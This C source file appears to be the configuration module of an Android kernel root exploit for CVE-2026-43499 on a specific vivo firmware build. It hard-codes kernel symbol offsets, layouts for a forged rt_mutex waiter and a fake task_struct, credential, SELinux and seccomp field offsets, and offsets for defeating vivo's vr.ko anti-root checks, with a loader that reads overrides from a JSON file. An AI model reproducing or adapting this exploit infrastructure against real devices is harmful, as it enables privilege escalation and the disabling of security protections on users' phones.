#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include "flat_json.h"

/* ---- Runtime-configurable target parameters ----
 * Defaults match PD2520-BP2A.250605.031.A3; override at runtime via env vars. */
uint64_t KIMAGE_TEXT_BASE             = 0xffffffc080000000ULL;
uint64_t P0_PAGE_OFFSET               = 0xffffff8000000000ULL;
uint64_t P0_PHYS_OFFSET               = 0x80000000ULL;
uint64_t P0_KERNEL_PHYS_LOAD          = 0xa8000000ULL;
uint64_t KERNELSNITCH_IDENTITY_START  = 0xffffff8000000000ULL;
uint64_t KERNELSNITCH_IDENTITY_END    = 0xffffff9000000000ULL;
uint64_t DIRECT_MAP_BASE              = 0xffffff8000000000ULL;
uint64_t DIRECT_MAP_END               = 0xffffff9000000000ULL;
uint64_t VMEMMAP_START                = 0xfffffffe00000000ULL;

uint32_t ASHMEM_MISC_FOPS_OFF         = 0x0227c528u;
uint32_t ASHMEM_FOPS_OFF              = 0x012ef180u;
uint32_t ASHMEM_IOCTL_OFF             = 0x00c8b1fcu;
uint32_t ASHMEM_COMPAT_IOCTL_OFF      = 0x00c8b8b8u;
uint32_t ASHMEM_MMAP_OFF              = 0x00c8b90cu;
uint32_t ASHMEM_OPEN_OFF              = 0x00c8bb2cu;
uint32_t ASHMEM_RELEASE_OFF           = 0x00c8bbb4u;
uint32_t ASHMEM_SHOW_FDINFO_OFF       = 0x00c8bc40u;
uint32_t CONFIGFS_READ_ITER_OFF       = 0x00490138u;
uint32_t CONFIGFS_BIN_WRITE_ITER_OFF  = 0x00490664u;
uint32_t COPY_SPLICE_READ_OFF         = 0x00413e2cu;
uint32_t NOOP_LLSEEK_OFF              = 0x003c6c04u;
uint32_t INIT_TASK_OFF                = 0x0211e280u;
uint32_t INIT_CRED_OFF                = 0x0211e280u;
uint32_t ROOT_TASK_GROUP_OFF          = 0x02317580u;
uint32_t SELINUX_BLOB_SIZES_OFF       = 0x0167a550u;
uint32_t SELINUX_ENFORCING_OFF        = 0x02358ee0u;
uint32_t SECURITY_HOOK_HEADS_OFF      = 0x01679e18u;
uint32_t KMALLOC_CACHES_OFF           = 0x01679958u;
uint32_t ANON_PIPE_BUF_OPS_OFF        = 0x0116e408u;

uint32_t SLIDE_NFULNL_LOGGER_OFF = 0x02112260ULL;
uint32_t SLIDE_LOGGERS_0_1_OFF = 0x021121b0ULL;
uint32_t SLIDE_RANDOM_BOOT_ID_DATA_OFF = 0x02239428ULL;
uint32_t SLIDE_SYSCTL_BOOTID_OFF = 0x02379ed8ULL;

uint32_t PSELECT_WAITER_WORD_SHIFT = 0;

/* ---- CEA / page layout within kernel page ---- */
uint32_t LOCK_OFF                   = 0x1350u;
uint32_t W0_OFF                     = 0x2220u;
uint32_t FOPS_OFF                   = 0x1000u;
uint32_t SCRATCH_OFF                = 0x3000u;
uint32_t RIGHT_OFF                  = 0x4440u;
uint32_t LEFT_OFF                   = 0x5550u;
uint32_t FAKE_TASK_OFF              = 0x3200u;

/* Forged waiter (as placed by pselect fdset) */
uint32_t FAKE_WAITER_TREE_PRIO_OFF       = 0x18u;
uint32_t FAKE_WAITER_TREE_DEADLINE_OFF   = 0x20u;
uint32_t FAKE_WAITER_PI_TREE_ENTRY_OFF   = 0x28u;
uint32_t FAKE_WAITER_PI_TREE_PRIO_OFF    = 0x40u;
uint32_t FAKE_WAITER_PI_TREE_DEADLINE_OFF = 0x48u;
uint32_t FAKE_WAITER_TASK_OFF            = 0x50u;
uint32_t FAKE_WAITER_LOCK_OFF            = 0x58u;
uint32_t FAKE_WAITER_WAKE_STATE_OFF      = 0x60u;
uint32_t FAKE_WAITER_WW_CTX_OFF          = 0x68u;

/* ---- Fake task_struct fields (BTF) ---- */
uint32_t FAKE_TASK_USAGE_OFF         = 0x40u;
uint32_t FAKE_TASK_PRIO_OFF          = 0x84u;
uint32_t FAKE_TASK_NORMAL_PRIO_OFF   = 0x8cu;
uint32_t FAKE_TASK_TASK_GROUP_OFF    = 0x348u;
uint32_t FAKE_TASK_PI_LOCK_OFF       = 0x90cu;
uint32_t FAKE_TASK_PI_WAITERS_OFF    = 0x920u;
uint32_t FAKE_TASK_PI_TOP_TASK_OFF   = 0x930u;
uint32_t FAKE_TASK_PI_BLOCKED_ON_OFF = 0x938u;

/* ---- configfs buffer (CFG) offsets ---- */
uint32_t CFG_PAGE_OFF            = 0x10u;
uint32_t CFG_NEEDS_READ_FILL_OFF = 0x50u;
uint32_t CFG_BIN_BUFFER_OFF      = 0x58u;
uint32_t CFG_BIN_BUFFER_SIZE_OFF = 0x60u;
uint32_t CFG_CB_MAX_SIZE_OFF     = 0x64u;

/* ---- task_struct field offsets (BTF) ---- */
uint32_t TASK_PID_OFF               = 0x618u;
uint32_t TASK_TGID_OFF              = 0x61cu;
uint32_t TASK_ATOMIC_FLAGS_OFF      = 0x5d8u;
uint32_t TASK_REAL_CRED_OFF         = 0x818u;
uint32_t TASK_CRED_OFF              = 0x820u;
uint32_t TASK_COMM_OFF              = 0x830u;
uint32_t TASK_TASKS_OFF             = 0x550u;
uint32_t TASK_THREAD_INFO_FLAGS_OFF = 0x0u;
uint32_t TASK_SECCOMP_OFF           = 0x8e8u;

/* ---- vivo vr.ko anti-root per-task tag (same GKI as PD2405) ---- */
uint32_t VR_TAG_A_OFF       = 0x06;
uint32_t VR_TAG_B_OFF       = 0x2cu;
uint32_t VR_SYSCALL_TP_FLAG = 0x400u;

/* ---- cred structure offsets (BTF) ---- */
uint32_t CRED_UID_OFF          = 0x8u;
uint32_t CRED_SECUREBITS_OFF   = 0x28u;
uint32_t CRED_CAPS_OFF         = 0x30u;
uint32_t CRED_SECURITY_OFF     = 0x80u;
uint32_t SELINUX_CRED_BLOB_OFF = 0x0u;
uint32_t SELINUX_CRED_OSID_OFF = 0x0u;
uint32_t SELINUX_CRED_SID_OFF  = 0x4u;

/* ---- seccomp offsets ---- */
uint32_t SECCOMP_MODE_OFF         = 0x0u;
uint32_t SECCOMP_FILTER_COUNT_OFF = 0x4u;
uint32_t SECCOMP_FILTER_OFF       = 0x8u;
uint32_t TIF_SECCOMP_BIT          = 0xbu;
uint32_t PFA_NO_NEW_PRIVS_BIT     = 0x0u;

/* ---- struct page / slab offsets ---- */
uint32_t STRUCT_PAGE_SIZE              = 0x40u;
uint32_t STRUCT_PAGE_COMPOUND_HEAD_OFF = 0x08u;
uint32_t STRUCT_SLAB_CACHE_OFF         = 0x08u;
uint32_t STRUCT_PAGE_TYPE_OFF          = 0x30u;

/* ---- pipe_buffer offsets ---- */
uint32_t PIPE_BUFFER_SLOTS      = 0x20u;
uint32_t PIPE_BUF_FLAG_CAN_MERGE = 0x10u;

/* ---- struct file_operations slot offsets ---- */
uint32_t FOPS_OWNER_OFF       = 0x0u;
uint32_t FOPS_LLSEEK_OFF      = 0x8u;
uint32_t FOPS_READ_OFF        = 0x10u;
uint32_t FOPS_WRITE_OFF       = 0x18u;
uint32_t FOPS_READ_ITER_OFF   = 0x20u;
uint32_t FOPS_WRITE_ITER_OFF  = 0x28u;
uint32_t FOPS_IOCTL_OFF       = 0x48u;
uint32_t FOPS_COMPAT_IOCTL_OFF = 0x50u;
uint32_t FOPS_MMAP_OFF        = 0x58u;
uint32_t FOPS_OPEN_OFF        = 0x68u;
uint32_t FOPS_RELEASE_OFF     = 0x78u;
uint32_t FOPS_SPLICE_READ_OFF = 0xb8u;
uint32_t FOPS_SHOW_FDINFO_OFF = 0xd8u;

/* ---- tracepoint struct offsets (BTF) ---- */
uint32_t SYS_EXIT_TP_OFF            = 0x22a2220u;
uint32_t RVH_COMMIT_CREDS_TP_OFF    = 0x22bbc70u;
uint32_t TRACEPOINT_PROBESTUB_OFF   = 0x30u;
uint32_t TRACEPOINT_FUNCS_OFF       = 0x48u;
uint32_t TRACEPOINT_FUNC_STRIDE     = 0x18u;
uint32_t TRACEPOINT_FUNC_FUNC_OFF   = 0x00u;
uint32_t VR_COMMIT_TO_SYSEXIT_DELTA = 0x60u;
uint32_t VR_KERNEL_IMAGE_MAX        = 0x4000000u;

/* ---- CVE-2026-43499 patch-config file loading ---- */

/* Read a whole file into a freshly-allocated NUL-terminated buffer. */
static bool read_file_contents(const char *path, char **out, size_t *out_len) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    printf("open config file failed: %s errno=%d\n", path, errno);
    return false;
  }
  struct stat st;
  if (fstat(fd, &st) != 0) {
    printf("fstat config file failed: %s errno=%d\n", path, errno);
    close(fd);
    return false;
  }
  printf("[DEBUG read_file_contents] path=%s size=%lld mode=%o\n",
         path, (long long)st.st_size, st.st_mode);
  if (st.st_size <= 0) {
    printf("empty config file\n");
    close(fd);
    return false;
  }

  char *buf = (char *)malloc((size_t)st.st_size + 1);
  if (!buf) {
    printf("out of memory reading config file\n");
    close(fd);
    return false;
  }
  size_t total = 0;
  while (total < (size_t)st.st_size) {
    ssize_t n = read(fd, buf + total, (size_t)st.st_size - total);
    if (n < 0) {
      if (errno == EINTR) continue;
      printf("read config file failed: errno=%d\n", errno);
      free(buf);
      close(fd);
      return false;
    }
    if (n == 0) break;
    total += (size_t)n;
  }
  close(fd);
  buf[total] = '\0';

  *out = buf;
  *out_len = total;
  return true;
}

/* Locate the JSON payload: the first '{' marks the start. */
static bool extract_json_payload(const char *text, const char **start, const char **end) {
  const char *s = strchr(text, '{');
  if (!s) return false;

  int depth = 0;
  const char *e = NULL;
  for (const char *q = s; *q; q++) {
    if (*q == '{') depth++;
    else if (*q == '}' && --depth == 0) {
      e = q;
      break;
    }
  }
  if (!e) return false;

  *start = s;
  *end = e;
  return true;
}

/* Load the CVE-2026-43499 patch-config JSON from `path` into `out_json`. */
bool load_patch_json_from_file(const char *path, char *out_json, size_t out_json_size) {
  if (!out_json || out_json_size == 0) {
    printf("invalid output buffer\n");
    return false;
  }

  char *buf = NULL;
  size_t len = 0;
  if (!read_file_contents(path, &buf, &len)) {
    printf("read file failed: %s\n", path);
    return false;
  }

  const char *start = NULL;
  const char *end = NULL;
  if (!extract_json_payload(buf, &start, &end)) {
    printf("json braces not found in config file\n");
    free(buf);
    return false;
  }

  size_t json_len = (size_t)(end - start) + 1;
  if (json_len >= out_json_size) {
    printf("json too large: %zu (max %zu)\n", json_len, out_json_size - 1);
    free(buf);
    return false;
  }

  memcpy(out_json, start, json_len);
  out_json[json_len] = '\0';
  free(buf);
  return true;
}

bool load_cve2026_43499_config(const char *json_text) {
  FlatJson json;
  flat_json_init(&json);
  if (!flat_json_parse(&json, json_text, strlen(json_text))) return false;

#define LOAD_U32(name) name = flat_json_get_u32_or(&json, #name, name)
#define LOAD_U64(name) name = flat_json_get_u64_or(&json, #name, name)

  /* Kernel address parameters */
  LOAD_U64(KIMAGE_TEXT_BASE);
  LOAD_U64(P0_PAGE_OFFSET);
  LOAD_U64(P0_PHYS_OFFSET);
  LOAD_U64(P0_KERNEL_PHYS_LOAD);
  LOAD_U64(KERNELSNITCH_IDENTITY_START);
  LOAD_U64(KERNELSNITCH_IDENTITY_END);
  LOAD_U64(DIRECT_MAP_BASE);
  LOAD_U64(DIRECT_MAP_END);
  LOAD_U64(VMEMMAP_START);

  /* Kernel symbol offsets */
  LOAD_U32(ASHMEM_MISC_FOPS_OFF);
  LOAD_U32(ASHMEM_FOPS_OFF);
  LOAD_U32(ASHMEM_IOCTL_OFF);
  LOAD_U32(ASHMEM_COMPAT_IOCTL_OFF);
  LOAD_U32(ASHMEM_MMAP_OFF);
  LOAD_U32(ASHMEM_OPEN_OFF);
  LOAD_U32(ASHMEM_RELEASE_OFF);
  LOAD_U32(ASHMEM_SHOW_FDINFO_OFF);
  LOAD_U32(CONFIGFS_READ_ITER_OFF);
  LOAD_U32(CONFIGFS_BIN_WRITE_ITER_OFF);
  LOAD_U32(COPY_SPLICE_READ_OFF);
  LOAD_U32(NOOP_LLSEEK_OFF);
  LOAD_U32(INIT_TASK_OFF);
  LOAD_U32(INIT_CRED_OFF);
  LOAD_U32(ROOT_TASK_GROUP_OFF);
  LOAD_U32(SELINUX_BLOB_SIZES_OFF);
  LOAD_U32(SELINUX_ENFORCING_OFF);
  LOAD_U32(SECURITY_HOOK_HEADS_OFF);
  LOAD_U32(KMALLOC_CACHES_OFF);
  LOAD_U32(ANON_PIPE_BUF_OPS_OFF);

  /* Slide symbols */
  LOAD_U32(SLIDE_NFULNL_LOGGER_OFF);
  LOAD_U32(SLIDE_LOGGERS_0_1_OFF);
  LOAD_U32(SLIDE_RANDOM_BOOT_ID_DATA_OFF);
  LOAD_U32(SLIDE_SYSCTL_BOOTID_OFF);
  LOAD_U32(PSELECT_WAITER_WORD_SHIFT);

  /* CEA / page layout */
  LOAD_U32(LOCK_OFF);
  LOAD_U32(W0_OFF);
  LOAD_U32(FOPS_OFF);
  LOAD_U32(SCRATCH_OFF);
  LOAD_U32(RIGHT_OFF);
  LOAD_U32(LEFT_OFF);
  LOAD_U32(FAKE_TASK_OFF);

  /* Forged waiter */
  LOAD_U32(FAKE_WAITER_TREE_PRIO_OFF);
  LOAD_U32(FAKE_WAITER_TREE_DEADLINE_OFF);
  LOAD_U32(FAKE_WAITER_PI_TREE_ENTRY_OFF);
  LOAD_U32(FAKE_WAITER_PI_TREE_PRIO_OFF);
  LOAD_U32(FAKE_WAITER_PI_TREE_DEADLINE_OFF);
  LOAD_U32(FAKE_WAITER_TASK_OFF);
  LOAD_U32(FAKE_WAITER_LOCK_OFF);
  LOAD_U32(FAKE_WAITER_WAKE_STATE_OFF);
  LOAD_U32(FAKE_WAITER_WW_CTX_OFF);

  /* Fake task_struct */
  LOAD_U32(FAKE_TASK_USAGE_OFF);
  LOAD_U32(FAKE_TASK_PRIO_OFF);
  LOAD_U32(FAKE_TASK_NORMAL_PRIO_OFF);
  LOAD_U32(FAKE_TASK_TASK_GROUP_OFF);
  LOAD_U32(FAKE_TASK_PI_LOCK_OFF);
  LOAD_U32(FAKE_TASK_PI_WAITERS_OFF);
  LOAD_U32(FAKE_TASK_PI_TOP_TASK_OFF);
  LOAD_U32(FAKE_TASK_PI_BLOCKED_ON_OFF);

  /* configfs buffer */
  LOAD_U32(CFG_PAGE_OFF);
  LOAD_U32(CFG_NEEDS_READ_FILL_OFF);
  LOAD_U32(CFG_BIN_BUFFER_OFF);
  LOAD_U32(CFG_BIN_BUFFER_SIZE_OFF);
  LOAD_U32(CFG_CB_MAX_SIZE_OFF);

  /* task_struct */
  LOAD_U32(TASK_PID_OFF);
  LOAD_U32(TASK_TGID_OFF);
  LOAD_U32(TASK_ATOMIC_FLAGS_OFF);
  LOAD_U32(TASK_REAL_CRED_OFF);
  LOAD_U32(TASK_CRED_OFF);
  LOAD_U32(TASK_COMM_OFF);
  LOAD_U32(TASK_TASKS_OFF);
  LOAD_U32(TASK_THREAD_INFO_FLAGS_OFF);
  LOAD_U32(TASK_SECCOMP_OFF);

  /* vivo vr.ko */
  LOAD_U32(VR_TAG_A_OFF);
  LOAD_U32(VR_TAG_B_OFF);
  LOAD_U32(VR_SYSCALL_TP_FLAG);

  /* struct cred */
  LOAD_U32(CRED_UID_OFF);
  LOAD_U32(CRED_SECUREBITS_OFF);
  LOAD_U32(CRED_CAPS_OFF);
  LOAD_U32(CRED_SECURITY_OFF);
  LOAD_U32(SELINUX_CRED_BLOB_OFF);
  LOAD_U32(SELINUX_CRED_OSID_OFF);
  LOAD_U32(SELINUX_CRED_SID_OFF);

  /* seccomp */
  LOAD_U32(SECCOMP_MODE_OFF);
  LOAD_U32(SECCOMP_FILTER_COUNT_OFF);
  LOAD_U32(SECCOMP_FILTER_OFF);
  LOAD_U32(TIF_SECCOMP_BIT);
  LOAD_U32(PFA_NO_NEW_PRIVS_BIT);

  /* struct page / slab */
  LOAD_U32(STRUCT_PAGE_SIZE);
  LOAD_U32(STRUCT_PAGE_COMPOUND_HEAD_OFF);
  LOAD_U32(STRUCT_SLAB_CACHE_OFF);
  LOAD_U32(STRUCT_PAGE_TYPE_OFF);

  /* pipe_buffer */
  LOAD_U32(PIPE_BUFFER_SLOTS);
  LOAD_U32(PIPE_BUF_FLAG_CAN_MERGE);

  /* file_operations */
  LOAD_U32(FOPS_OWNER_OFF);
  LOAD_U32(FOPS_LLSEEK_OFF);
  LOAD_U32(FOPS_READ_OFF);
  LOAD_U32(FOPS_WRITE_OFF);
  LOAD_U32(FOPS_READ_ITER_OFF);
  LOAD_U32(FOPS_WRITE_ITER_OFF);
  LOAD_U32(FOPS_IOCTL_OFF);
  LOAD_U32(FOPS_COMPAT_IOCTL_OFF);
  LOAD_U32(FOPS_MMAP_OFF);
  LOAD_U32(FOPS_OPEN_OFF);
  LOAD_U32(FOPS_RELEASE_OFF);
  LOAD_U32(FOPS_SPLICE_READ_OFF);
  LOAD_U32(FOPS_SHOW_FDINFO_OFF);

  /* tracepoint */
  LOAD_U32(SYS_EXIT_TP_OFF);
  LOAD_U32(RVH_COMMIT_CREDS_TP_OFF);
  LOAD_U32(TRACEPOINT_PROBESTUB_OFF);
  LOAD_U32(TRACEPOINT_FUNCS_OFF);
  LOAD_U32(TRACEPOINT_FUNC_STRIDE);
  LOAD_U32(TRACEPOINT_FUNC_FUNC_OFF);
  LOAD_U32(VR_COMMIT_TO_SYSEXIT_DELTA);
  LOAD_U32(VR_KERNEL_IMAGE_MAX);

#undef LOAD_U32
#undef LOAD_U64

  flat_json_destroy(&json);
  return true;
}
